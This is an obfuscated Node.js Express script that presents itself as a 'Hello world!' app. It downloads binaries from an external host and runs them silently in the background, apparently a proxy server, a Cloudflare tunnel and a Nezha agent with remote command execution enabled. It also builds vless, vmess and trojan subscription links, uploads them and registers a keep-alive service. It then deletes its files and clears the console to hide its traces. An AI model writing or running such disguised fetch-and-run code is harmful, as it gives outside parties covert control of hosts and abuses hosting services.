const _0x161b87=_0x3aa8;(function(_0x4b777d,_0x3bd2af){const _0x1c63ab=_0x3aa8,_0x4c31a3=_0x4b777d();while(!![]){try{const _0x10fba8=parseInt(_0x1c63ab(0x298))/0x1*(-parseInt(_0x1c63ab(0x246))/0x2)+-parseInt(_0x1c63ab(0x2af))/0x3*(-parseInt(_0x1c63ab(0x251))/0x4)+-parseInt(_0x1c63ab(0x1f8))/0x5+-parseInt(_0x1c63ab(0x291))/0x6+parseInt(_0x1c63ab(0x208))/0x7+parseInt(_0x1c63ab(0x20f))/0x8*(-parseInt(_0x1c63ab(0x209))/0x9)+parseInt(_0x1c63ab(0x27d))/0xa;if(_0x10fba8===_0x3bd2af)break;else _0x4c31a3['push'](_0x4c31a3['shift']());}catch(_0x4e9252){_0x4c31a3['push'](_0x4c31a3['shift']());}}}(_0x475c,0x6d256));function _0x475c(){const _0x3b3000=['Empowerment\x20failed\x20for\x20','NEZHA_SERVER','499776egzuFv','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','Error\x20downloading\x20files:','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','tunnel.json','match','false','/api/add-nodes','NAME','tunnel.yml','base64','4VEFXTd','rm\x20-rf\x20','https://amd64.ssss.nyc.mn/2go','clear','Error\x20reading\x20boot.log:','ARGO_PORT','web\x20running\x20error:\x20','exec','list.txt','https://arm64.ssss.nyc.mn/web','web','trim','/sub.txt\x20saved\x20successfully','./bot','/api/add-subscriptions','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','https://arm64.ssss.nyc.mn/agent','NEZHA\x20variable\x20is\x20empty,skip\x20running','php\x20is\x20running','utf-8','UUID','&path=%2Ftrojan-argo%3Fed%3D2560#','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','unlink','8443','ARGO_DOMAIN','Error\x20executing\x20command:\x20','blackhole','trojan','http','catch','https://amd64.ssss.nyc.mn/v1','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','ARGO_AUTH','UPLOAD_URL','boot.log','get','map','2053','./web','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','http\x20server\x20is\x20running\x20on\x20port:','env','\x0a\x20\x20\x0atrojan://','5783150nbjKjX','has','\x0a\x20\x20tunnel:\x20','/php\x20-c\x20\x22','tls','forEach','data','https://arm64.ssss.nyc.mn/v1','npm\x20is\x20running','php','block','\x0avless://','npm','log','arm','https://arm64.ssss.nyc.mn/2go','tcp','\x20>/dev/null\x202>&1','NEZHA_KEY','https+local://8.8.8.8/dns-query','5256528UwzZpZ','./npm','326a93b8-2f25-4dfb-947c-ed07eb61ebb6','existsSync','pipe','vless','127.0.0.1','1rkALKh','config.yaml','eyJhIjoiMDgwNmE5MmMxNzZkZjRkNjM3MjIxZmMyMjM1OTQyMTAiLCJ0IjoiMzM4NTVhNTMtMzQ2OS00NTY4LThmZDYtZGQ2YTRiZjM1Y2Y5IiwicyI6Ik1EZzFOalJqTjJNdFlXTmpaaTAwWVdObExXSmpOVFV0Tm1OaU5UWm1OVEJoTmpobSJ9','all','readFileSync','filter','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','?encryption=none&security=tls&sni=','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','pop','\x0a\x20\x20\x20\x20','/vless-argo','bot','App\x20is\x20running','direct','arch','test','PORT','\x20successfully','config.json','post','/api/delete-nodes','response','1841394UADBiD','mkdirSync','\x20>/dev/null\x202>&1\x20&','fileUrl','bot\x20is\x20running.','/web\x20-c\x20','/config.json\x20>/dev/null\x202>&1\x20&','添加URL失败:\x20','/vmess-argo','85090kMzZBO','vmess','from','createWriteStream','443','sub','php\x20running\x20error:\x20','--tls','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','ArgoDomain:','length','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','axios','www.speedtest.net','/dev/null','application/json','4551743iVahoh','378459wdfMWv','CFIP','grand.ufoo.dpdns.org','util','CFPORT','https://amd64.ssss.nyc.mn/agent','48TurgNo','push','join','&type=ws&host=','/npm\x20-s\x20','error','nohup\x20','set','\x20failed:\x20','npm\x20running\x20error:\x20','status','/trojan-argo','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','split','TunnelSecret','./tmp','xtls-rprx-vision','/tunnel.yml\x20run','express','Hello\x20world!','writeFileSync','https://oooo.serv00.net/add-url','\x20already\x20exists','\x20is\x20created','2083','child_process','amd','message','stringify','\x0aclient_secret:\x20','SUB_PATH','toString','Subscription\x20uploaded\x20successfully','2096','unshift','/vmess-argo?ed=2560','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','Skipping\x20adding\x20automatic\x20access\x20task','AUTO_ACCESS','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','none','web\x20is\x20running','/bot\x20','SERVER_PORT','chmod','\x20-p\x20','includes','./php','ARGO_DOMAIN:','text/plain;\x20charset=utf-8','arm64','quic','\x0a\x20\x20credentials-file:\x20'];_0x475c=function(){return _0x3b3000;};return _0x475c();}const express=require(_0x161b87(0x221)),app=express(),axios=require(_0x161b87(0x204)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x161b87(0x20c)),exec=promisify(require(_0x161b87(0x228))[_0x161b87(0x258)]),{execSync}=require(_0x161b87(0x228)),UPLOAD_URL=process[_0x161b87(0x27b)][_0x161b87(0x273)]||'',PROJECT_URL=process[_0x161b87(0x27b)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x161b87(0x27b)][_0x161b87(0x235)]||![],FILE_PATH=process['env']['FILE_PATH']||_0x161b87(0x21e),SUB_PATH=process['env'][_0x161b87(0x22d)]||_0x161b87(0x1fd),PORT=process[_0x161b87(0x27b)][_0x161b87(0x23a)]||process['env'][_0x161b87(0x2a9)]||0xbb8,UUID=process[_0x161b87(0x27b)][_0x161b87(0x265)]||_0x161b87(0x293),NEZHA_SERVER=process[_0x161b87(0x27b)][_0x161b87(0x245)]||'',NEZHA_PORT=process[_0x161b87(0x27b)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x161b87(0x27b)][_0x161b87(0x28f)]||'',ARGO_DOMAIN=process[_0x161b87(0x27b)][_0x161b87(0x26a)]||_0x161b87(0x20b),ARGO_AUTH=process[_0x161b87(0x27b)][_0x161b87(0x272)]||_0x161b87(0x29a),ARGO_PORT=process[_0x161b87(0x27b)][_0x161b87(0x256)]||0x7b0c,CFIP=process[_0x161b87(0x27b)][_0x161b87(0x20a)]||_0x161b87(0x205),CFPORT=process[_0x161b87(0x27b)][_0x161b87(0x20d)]||0x1bb,NAME=process[_0x161b87(0x27b)][_0x161b87(0x24e)]||'Vls';!fs[_0x161b87(0x294)](FILE_PATH)?(fs[_0x161b87(0x2b0)](FILE_PATH),console['log'](FILE_PATH+_0x161b87(0x226))):console[_0x161b87(0x28a)](FILE_PATH+_0x161b87(0x225));let npmPath=path[_0x161b87(0x211)](FILE_PATH,_0x161b87(0x289)),phpPath=path[_0x161b87(0x211)](FILE_PATH,_0x161b87(0x286)),webPath=path['join'](FILE_PATH,_0x161b87(0x25b)),botPath=path[_0x161b87(0x211)](FILE_PATH,_0x161b87(0x2a4)),subPath=path[_0x161b87(0x211)](FILE_PATH,'sub.txt'),listPath=path[_0x161b87(0x211)](FILE_PATH,_0x161b87(0x259)),bootLogPath=path[_0x161b87(0x211)](FILE_PATH,_0x161b87(0x274)),configPath=path[_0x161b87(0x211)](FILE_PATH,_0x161b87(0x2ab));function deleteNodes(){const _0x50685c=_0x161b87;try{if(!UPLOAD_URL)return;if(!fs[_0x50685c(0x294)](subPath))return;let _0x202784;try{_0x202784=fs[_0x50685c(0x29c)](subPath,'utf-8');}catch{return null;}const _0x23b4cd=Buffer[_0x50685c(0x1fa)](_0x202784,'base64')['toString'](_0x50685c(0x264)),_0x8093cc=_0x23b4cd[_0x50685c(0x21c)]('\x0a')['filter'](_0xd0e7f4=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x50685c(0x2a8)](_0xd0e7f4));if(_0x8093cc[_0x50685c(0x202)]===0x0)return;return axios['post'](UPLOAD_URL+_0x50685c(0x2ad),JSON[_0x50685c(0x22b)]({'nodes':_0x8093cc}),{'headers':{'Content-Type':'application/json'}})[_0x50685c(0x26f)](_0x105be9=>{return null;});}catch(_0x40b020){return null;}}function cleanupOldFiles(){const _0x54c67b=_0x161b87,_0x5d3ca3=[_0x54c67b(0x25b),_0x54c67b(0x2a4),_0x54c67b(0x289),'php','sub.txt',_0x54c67b(0x274)];_0x5d3ca3[_0x54c67b(0x282)](_0x168be2=>{const _0x24e21d=_0x54c67b,_0x1d5be9=path[_0x24e21d(0x211)](FILE_PATH,_0x168be2);fs[_0x24e21d(0x268)](_0x1d5be9,()=>{});});}app[_0x161b87(0x275)]('/',function(_0xafd584,_0xd7117b){const _0x149705=_0x161b87;_0xd7117b['send'](_0x149705(0x222));});const config={'log':{'access':_0x161b87(0x206),'error':_0x161b87(0x206),'loglevel':_0x161b87(0x237)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x161b87(0x21f)}],'decryption':_0x161b87(0x237),'fallbacks':[{'dest':0xbb9},{'path':_0x161b87(0x2a3),'dest':0xbba},{'path':_0x161b87(0x1f7),'dest':0xbbb},{'path':_0x161b87(0x21a),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x161b87(0x237)},'streamSettings':{'network':_0x161b87(0x28d),'security':_0x161b87(0x237)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x161b87(0x296),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x161b87(0x237)},'streamSettings':{'network':'ws','security':_0x161b87(0x237),'wsSettings':{'path':_0x161b87(0x2a3)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x161b87(0x281),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x161b87(0x297),'protocol':_0x161b87(0x1f9),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x161b87(0x26e),_0x161b87(0x281),_0x161b87(0x242)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x161b87(0x297),'protocol':_0x161b87(0x26d),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x161b87(0x21a)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x161b87(0x242)],'metadataOnly':![]}}],'dns':{'servers':[_0x161b87(0x290)]},'outbounds':[{'protocol':'freedom','tag':_0x161b87(0x2a6)},{'protocol':_0x161b87(0x26c),'tag':_0x161b87(0x287)}]};fs[_0x161b87(0x223)](path[_0x161b87(0x211)](FILE_PATH,'config.json'),JSON[_0x161b87(0x22b)](config,null,0x2));function _0x3aa8(_0x3acd8b,_0x2979bc){const _0x475c36=_0x475c();return _0x3aa8=function(_0x3aa8ea,_0x2fd33a){_0x3aa8ea=_0x3aa8ea-0x1f1;let _0x593e13=_0x475c36[_0x3aa8ea];return _0x593e13;},_0x3aa8(_0x3acd8b,_0x2979bc);}function getSystemArchitecture(){const _0x2294c7=_0x161b87,_0x45d07a=os[_0x2294c7(0x2a7)]();return _0x45d07a==='arm'||_0x45d07a===_0x2294c7(0x241)||_0x45d07a==='aarch64'?_0x2294c7(0x28b):_0x2294c7(0x229);}function downloadFile(_0x5f3bb4,_0x2f6371,_0x1b265f){const _0x54174f=_0x161b87,_0x56d48a=path[_0x54174f(0x211)](FILE_PATH,_0x5f3bb4),_0x466da0=fs[_0x54174f(0x1fb)](_0x56d48a);axios({'method':'get','url':_0x2f6371,'responseType':'stream'})['then'](_0xb6b9f9=>{const _0x14547d=_0x54174f;_0xb6b9f9[_0x14547d(0x283)][_0x14547d(0x295)](_0x466da0),_0x466da0['on']('finish',()=>{const _0x34b4a3=_0x14547d;_0x466da0['close'](),console['log']('Download\x20'+_0x5f3bb4+_0x34b4a3(0x2aa)),_0x1b265f(null,_0x5f3bb4);}),_0x466da0['on'](_0x14547d(0x214),_0x8e349=>{const _0x59d8ca=_0x14547d;fs[_0x59d8ca(0x268)](_0x56d48a,()=>{});const _0x2493d6='Download\x20'+_0x5f3bb4+_0x59d8ca(0x217)+_0x8e349[_0x59d8ca(0x22a)];console[_0x59d8ca(0x214)](_0x2493d6),_0x1b265f(_0x2493d6);});})[_0x54174f(0x26f)](_0x557861=>{const _0x3197de=_0x54174f,_0x29dedf='Download\x20'+_0x5f3bb4+'\x20failed:\x20'+_0x557861['message'];console[_0x3197de(0x214)](_0x29dedf),_0x1b265f(_0x29dedf);});}async function downloadFilesAndRun(){const _0x935634=_0x161b87,_0x122ea4=getSystemArchitecture(),_0xe7ee46=getFilesForArchitecture(_0x122ea4);if(_0xe7ee46[_0x935634(0x202)]===0x0){console[_0x935634(0x28a)](_0x935634(0x29e));return;}const _0x3fd494=_0xe7ee46[_0x935634(0x276)](_0x5ed0b4=>{return new Promise((_0xfe28a4,_0x424e62)=>{const _0x57989b=_0x3aa8;downloadFile(_0x5ed0b4['fileName'],_0x5ed0b4[_0x57989b(0x1f2)],(_0x3be9ac,_0x4b513a)=>{_0x3be9ac?_0x424e62(_0x3be9ac):_0xfe28a4(_0x4b513a);});});});try{await Promise[_0x935634(0x29b)](_0x3fd494);}catch(_0x43d5d3){console[_0x935634(0x214)](_0x935634(0x248),_0x43d5d3);return;}function _0x3fedea(_0x2ebff2){const _0x57b2ec=0x1fd;_0x2ebff2['forEach'](_0x299f74=>{const _0x3c3406=_0x3aa8,_0x2615a8=path[_0x3c3406(0x211)](FILE_PATH,_0x299f74);fs[_0x3c3406(0x294)](_0x2615a8)&&fs[_0x3c3406(0x23b)](_0x2615a8,_0x57b2ec,_0x5e476e=>{const _0x312b3e=_0x3c3406;_0x5e476e?console['error'](_0x312b3e(0x244)+_0x2615a8+':\x20'+_0x5e476e):console[_0x312b3e(0x28a)]('Empowerment\x20success\x20for\x20'+_0x2615a8+':\x20'+_0x57b2ec[_0x312b3e(0x22e)](0x8));});});}const _0x69f24=NEZHA_PORT?[_0x935634(0x292),_0x935634(0x278),'./bot']:[_0x935634(0x23e),_0x935634(0x278),_0x935634(0x25e)];_0x3fedea(_0x69f24);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x442ba2=NEZHA_SERVER[_0x935634(0x23d)](':')?NEZHA_SERVER[_0x935634(0x21c)](':')[_0x935634(0x2a1)]():'',_0xe2fc44=new Set([_0x935634(0x1fc),'8443',_0x935634(0x230),'2087',_0x935634(0x227),_0x935634(0x277)]),_0x5cb88a=_0xe2fc44[_0x935634(0x27e)](_0x442ba2)?'true':_0x935634(0x24c),_0xa24da1=_0x935634(0x22c)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20'+_0x5cb88a+_0x935634(0x267)+UUID;fs[_0x935634(0x223)](path[_0x935634(0x211)](FILE_PATH,_0x935634(0x299)),_0xa24da1);const _0x4d30e0=_0x935634(0x215)+FILE_PATH+_0x935634(0x280)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4d30e0),console['log'](_0x935634(0x263)),await new Promise(_0x932da0=>setTimeout(_0x932da0,0x3e8));}catch(_0x1a57d7){console['error'](_0x935634(0x1fe)+_0x1a57d7);}}else{let _0x54747a='';const _0x304a21=[_0x935634(0x1fc),_0x935634(0x269),_0x935634(0x230),'2087','2083',_0x935634(0x277)];_0x304a21[_0x935634(0x23d)](NEZHA_PORT)&&(_0x54747a=_0x935634(0x1ff));const _0x22aa50='nohup\x20'+FILE_PATH+_0x935634(0x213)+NEZHA_SERVER+':'+NEZHA_PORT+_0x935634(0x23c)+NEZHA_KEY+'\x20'+_0x54747a+_0x935634(0x1f1);try{await exec(_0x22aa50),console[_0x935634(0x28a)](_0x935634(0x285)),await new Promise(_0x36c573=>setTimeout(_0x36c573,0x3e8));}catch(_0x119f3a){console['error'](_0x935634(0x218)+_0x119f3a);}}}else console[_0x935634(0x28a)](_0x935634(0x262));const _0x3ede51=_0x935634(0x215)+FILE_PATH+_0x935634(0x1f4)+FILE_PATH+_0x935634(0x1f5);try{await exec(_0x3ede51),console[_0x935634(0x28a)](_0x935634(0x238)),await new Promise(_0x188afd=>setTimeout(_0x188afd,0x3e8));}catch(_0x2aca6b){console[_0x935634(0x214)](_0x935634(0x257)+_0x2aca6b);}if(fs[_0x935634(0x294)](path[_0x935634(0x211)](FILE_PATH,'bot'))){let _0xbafc25;if(ARGO_AUTH[_0x935634(0x24b)](/^[A-Z0-9a-z=]{120,250}$/))_0xbafc25=_0x935634(0x247)+ARGO_AUTH;else ARGO_AUTH[_0x935634(0x24b)](/TunnelSecret/)?_0xbafc25=_0x935634(0x249)+FILE_PATH+_0x935634(0x220):_0xbafc25=_0x935634(0x236)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x935634(0x215)+FILE_PATH+_0x935634(0x239)+_0xbafc25+_0x935634(0x1f1)),console[_0x935634(0x28a)]('bot\x20is\x20running'),await new Promise(_0x5d45ef=>setTimeout(_0x5d45ef,0x7d0));}catch(_0x40eafe){console[_0x935634(0x214)]('Error\x20executing\x20command:\x20'+_0x40eafe);}}await new Promise(_0x3458f2=>setTimeout(_0x3458f2,0x1388));}function getFilesForArchitecture(_0x39b632){const _0x28abcc=_0x161b87;let _0x4a4894;_0x39b632==='arm'?_0x4a4894=[{'fileName':_0x28abcc(0x25b),'fileUrl':_0x28abcc(0x25a)},{'fileName':'bot','fileUrl':_0x28abcc(0x28c)}]:_0x4a4894=[{'fileName':_0x28abcc(0x25b),'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':_0x28abcc(0x2a4),'fileUrl':_0x28abcc(0x253)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xd4b705=_0x39b632===_0x28abcc(0x28b)?_0x28abcc(0x261):_0x28abcc(0x20e);_0x4a4894[_0x28abcc(0x231)]({'fileName':_0x28abcc(0x289),'fileUrl':_0xd4b705});}else{const _0x2901fb=_0x39b632===_0x28abcc(0x28b)?_0x28abcc(0x284):_0x28abcc(0x270);_0x4a4894['unshift']({'fileName':'php','fileUrl':_0x2901fb});}}return _0x4a4894;}function argoType(){const _0x4aa121=_0x161b87;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4aa121(0x28a)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x4aa121(0x23d)](_0x4aa121(0x21d))){fs[_0x4aa121(0x223)](path[_0x4aa121(0x211)](FILE_PATH,_0x4aa121(0x24a)),ARGO_AUTH);const _0x3d14d2=_0x4aa121(0x27f)+ARGO_AUTH[_0x4aa121(0x21c)]('\x22')[0xb]+_0x4aa121(0x243)+path['join'](FILE_PATH,_0x4aa121(0x24a))+_0x4aa121(0x200)+ARGO_DOMAIN+_0x4aa121(0x233)+ARGO_PORT+_0x4aa121(0x203);fs['writeFileSync'](path[_0x4aa121(0x211)](FILE_PATH,_0x4aa121(0x24f)),_0x3d14d2);}else console['log'](_0x4aa121(0x260));}argoType();async function extractDomains(){const _0x3c66c1=_0x161b87;let _0x17381e;if(ARGO_AUTH&&ARGO_DOMAIN)_0x17381e=ARGO_DOMAIN,console[_0x3c66c1(0x28a)](_0x3c66c1(0x23f),_0x17381e),await _0x4a0d64(_0x17381e);else try{const _0x3ff3e0=fs[_0x3c66c1(0x29c)](path['join'](FILE_PATH,_0x3c66c1(0x274)),_0x3c66c1(0x264)),_0x1f8eea=_0x3ff3e0[_0x3c66c1(0x21c)]('\x0a'),_0x20d38f=[];_0x1f8eea['forEach'](_0x3e99b2=>{const _0x2c9337=_0x3c66c1,_0x25a74e=_0x3e99b2[_0x2c9337(0x24b)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x25a74e){const _0x33aa86=_0x25a74e[0x1];_0x20d38f[_0x2c9337(0x210)](_0x33aa86);}});if(_0x20d38f[_0x3c66c1(0x202)]>0x0)_0x17381e=_0x20d38f[0x0],console[_0x3c66c1(0x28a)](_0x3c66c1(0x201),_0x17381e),await _0x4a0d64(_0x17381e);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path[_0x3c66c1(0x211)](FILE_PATH,'boot.log'));async function _0xde26ca(){const _0x17e3c5=_0x3c66c1;try{await exec(_0x17e3c5(0x21b));}catch(_0x41ea2f){}}_0xde26ca(),await new Promise(_0x535dc8=>setTimeout(_0x535dc8,0xbb8));const _0x45de6c='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x3c66c1(0x279)+ARGO_PORT;try{await exec(_0x3c66c1(0x215)+path['join'](FILE_PATH,'bot')+'\x20'+_0x45de6c+'\x20>/dev/null\x202>&1\x20&'),console[_0x3c66c1(0x28a)](_0x3c66c1(0x1f3)),await new Promise(_0x5d18fd=>setTimeout(_0x5d18fd,0xbb8)),await extractDomains();}catch(_0x82097c){console[_0x3c66c1(0x214)](_0x3c66c1(0x26b)+_0x82097c);}}}catch(_0x920fbf){console['error'](_0x3c66c1(0x255),_0x920fbf);}async function _0x4a0d64(_0x162520){const _0x2d836e=_0x3c66c1,_0x35e3ef=execSync(_0x2d836e(0x2a0),{'encoding':'utf-8'}),_0x747d61=_0x35e3ef[_0x2d836e(0x25c)]();return new Promise(_0x3ba677=>{setTimeout(()=>{const _0x385d1e=_0x3aa8,_0x2283ee={'v':'2','ps':NAME+'-'+_0x747d61,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x385d1e(0x237),'net':'ws','type':_0x385d1e(0x237),'host':_0x162520,'path':_0x385d1e(0x232),'tls':_0x385d1e(0x281),'sni':_0x162520,'alpn':''},_0x49678c=_0x385d1e(0x288)+UUID+'@'+CFIP+':'+CFPORT+_0x385d1e(0x29f)+_0x162520+_0x385d1e(0x212)+_0x162520+'&path=%2Fvless-argo%3Fed%3D2560#'+NAME+'-'+_0x747d61+'\x0a\x20\x20\x0avmess://'+Buffer['from'](JSON['stringify'](_0x2283ee))['toString'](_0x385d1e(0x250))+_0x385d1e(0x27c)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x162520+_0x385d1e(0x212)+_0x162520+_0x385d1e(0x266)+NAME+'-'+_0x747d61+_0x385d1e(0x2a2);console[_0x385d1e(0x28a)](Buffer[_0x385d1e(0x1fa)](_0x49678c)['toString'](_0x385d1e(0x250))),fs[_0x385d1e(0x223)](subPath,Buffer[_0x385d1e(0x1fa)](_0x49678c)[_0x385d1e(0x22e)](_0x385d1e(0x250))),console[_0x385d1e(0x28a)](FILE_PATH+_0x385d1e(0x25d)),uplodNodes(),app[_0x385d1e(0x275)]('/'+SUB_PATH,(_0x20c2e8,_0x18ae0e)=>{const _0x4de60e=_0x385d1e,_0xe3d3f4=Buffer['from'](_0x49678c)[_0x4de60e(0x22e)](_0x4de60e(0x250));_0x18ae0e[_0x4de60e(0x216)]('Content-Type',_0x4de60e(0x240)),_0x18ae0e['send'](_0xe3d3f4);}),_0x3ba677(_0x49678c);},0x7d0);});}}async function uplodNodes(){const _0x2d28ee=_0x161b87;if(UPLOAD_URL&&PROJECT_URL){const _0x4be220=PROJECT_URL+'/'+SUB_PATH,_0x7203ac={'subscription':[_0x4be220]};try{const _0x3e3afe=await axios[_0x2d28ee(0x2ac)](UPLOAD_URL+_0x2d28ee(0x25f),_0x7203ac,{'headers':{'Content-Type':'application/json'}});if(_0x3e3afe[_0x2d28ee(0x219)]===0xc8)console[_0x2d28ee(0x28a)](_0x2d28ee(0x22f));else return null;}catch(_0x55a309){if(_0x55a309[_0x2d28ee(0x2ae)]){if(_0x55a309['response'][_0x2d28ee(0x219)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x2d28ee(0x294)](listPath))return;const _0x4af18d=fs['readFileSync'](listPath,_0x2d28ee(0x264)),_0xf739b5=_0x4af18d[_0x2d28ee(0x21c)]('\x0a')[_0x2d28ee(0x29d)](_0x3db9b9=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x3db9b9));if(_0xf739b5['length']===0x0)return;const _0x1871db=JSON[_0x2d28ee(0x22b)]({'nodes':_0xf739b5});try{await axios[_0x2d28ee(0x2ac)](UPLOAD_URL+_0x2d28ee(0x24d),_0x1871db,{'headers':{'Content-Type':_0x2d28ee(0x207)}});if(response[_0x2d28ee(0x219)]===0xc8)console[_0x2d28ee(0x28a)](_0x2d28ee(0x22f));else return null;}catch(_0x2c0a43){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x21e722=_0x3aa8,_0x44c805=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x44c805['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x44c805[_0x21e722(0x210)](phpPath);exec(_0x21e722(0x252)+_0x44c805[_0x21e722(0x211)]('\x20')+_0x21e722(0x28e),_0x40414d=>{const _0x2a26a7=_0x21e722;console[_0x2a26a7(0x254)](),console[_0x2a26a7(0x28a)](_0x2a26a7(0x2a5)),console['log'](_0x2a26a7(0x271));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x24c9d8=_0x161b87;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x24c9d8(0x28a)](_0x24c9d8(0x234));return;}try{const _0x29497c=await axios[_0x24c9d8(0x2ac)](_0x24c9d8(0x224),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x24c9d8(0x207)}});console[_0x24c9d8(0x28a)]('automatic\x20access\x20task\x20added\x20successfully');}catch(_0x6b437b){console[_0x24c9d8(0x214)](_0x24c9d8(0x1f6)+_0x6b437b[_0x24c9d8(0x22a)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app['listen'](PORT,()=>console['log'](_0x161b87(0x27a)+PORT+'!'));
